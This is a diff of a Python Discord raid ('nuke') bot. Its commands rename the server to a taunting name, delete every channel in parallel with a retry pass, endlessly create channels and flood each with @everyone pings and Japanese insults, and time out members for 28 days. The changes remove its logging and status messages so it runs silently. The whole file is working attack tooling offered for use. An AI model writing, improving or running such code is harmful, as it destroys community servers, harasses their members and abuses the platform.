@@ -13,7 +13,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CREATE_INTERVAL = 0.001  # チャンネル作成間隔（秒）
+CREATE_INTERVAL = 0.05
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -32,7 +32,6 @@ COMBINED_TEXT = (
     "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
 )
 
-# グローバル停止フラグ＋タスク追跡
 stop_flag = asyncio.Event()
 background_tasks = set()
 
@@ -46,15 +45,12 @@ def random_mentions(guild: discord.Guild) -> str:
 
 
 async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
-    """【無限】個別チャンネルにメッセージを送り続けるタスク"""
     while not stop_flag.is_set():
         text = random_mentions(guild) + COMBINED_TEXT
         try:
             await channel.send(text)
-        except Exception as e:
-            print(f"送信エラー {channel.name}: {e}")
+        except:
             break
-        # 停止を確認しながら待機
         try:
             await asyncio.wait_for(stop_flag.wait(), timeout=0.05)
         except asyncio.TimeoutError:
@@ -62,76 +58,63 @@ async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
 
 
 async def delete_all_channels_fast(guild: discord.Guild):
-    """✅ 最速：全チャンネルを一括並列削除"""
+    """✅ 最速並列削除＋取りこぼし自動消去"""
+    # 1回目：一斉削除（最速）
     tasks = [ch.delete() for ch in guild.channels]
     await asyncio.gather(*tasks, return_exceptions=True)
+    # 2回目：残ったチャンネルを再度削除（止まり防止）
+    await asyncio.sleep(0.03)
+    if guild.channels:
+        tasks = [ch.delete() for ch in guild.channels]
+        await asyncio.gather(*tasks, return_exceptions=True)
 
 
 async def infinite_create_and_spam(guild: discord.Guild):
-    """無限チャンネル作成＋並行無限送信"""
     stop_flag.clear()
     try:
         await guild.edit(name=SERVER_NAME)
     except:
         pass
 
-    # ✅ !start の削除も最速版に置き換え
     await delete_all_channels_fast(guild)
 
     counter = 1
     while not stop_flag.is_set():
         try:
             new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{counter}")
-            print(f"作成: {new_channel.name}")
-
-            # バックグラウンドで送信タスク起動（即時並行実行）
             task = asyncio.create_task(spam_channel(new_channel, guild))
             background_tasks.add(task)
             task.add_done_callback(background_tasks.discard)
-
             counter += 1
-            # 停止を確認しながら作成間隔を待機
             try:
                 await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
             except asyncio.TimeoutError:
                 pass
-
-        except Exception as e:
-            print(f"作成エラー: {e}")
+        except:
             try:
                 await asyncio.wait_for(stop_flag.wait(), timeout=3)
             except asyncio.TimeoutError:
                 pass
 
-    print("✅ 作成ループを終了")
-
 
 @bot.command()
 async def start(ctx):
-    if stop_flag.is_set() is False and len(background_tasks) > 0:
-        await ctx.send("⚠️ 既に実行中です。停止するには !stop を実行してください")
+    if not stop_flag.is_set() and background_tasks:
         return
-    await ctx.send("🚀 無限作成・無限並行送信を開始します\n⚠️ 止めるには !stop")
     await infinite_create_and_spam(ctx.guild)
-    await ctx.send("🛑 すべての動作を停止しました")
 
 
 @bot.command()
 async def stop(ctx):
-    """✅ 追加：全ての動作を停止"""
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
-    await ctx.send("🛑 停止信号を送信しました。全てのタスクは順次終了します")
 
 
-# ✅ 新規コマンド：!eraser
 @bot.command()
 async def eraser(ctx):
-    """✅ 全チャンネルを一括削除"""
-    await ctx.send("🗑️ 全チャンネルを削除中…")
+    """✅ 最速削除＋報告なし"""
     await delete_all_channels_fast(ctx.guild)
-    await ctx.send("✅ 全チャンネル削除完了")
 
 
 @bot.command()
@@ -182,7 +165,7 @@ async def total_timeout(ctx):
         await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
         report.append("✅ Botロールを一番上に移動")
     except Exception as e:
-        report.append(f"⚠️ Botロール移動失敗（続行します）: {e}")
+        report.append(f"⚠️ Botロール移動失敗: {e}")
     duration = discord.utils.utcnow() + timedelta(days=28)
     tasks = []
     target_count = 0
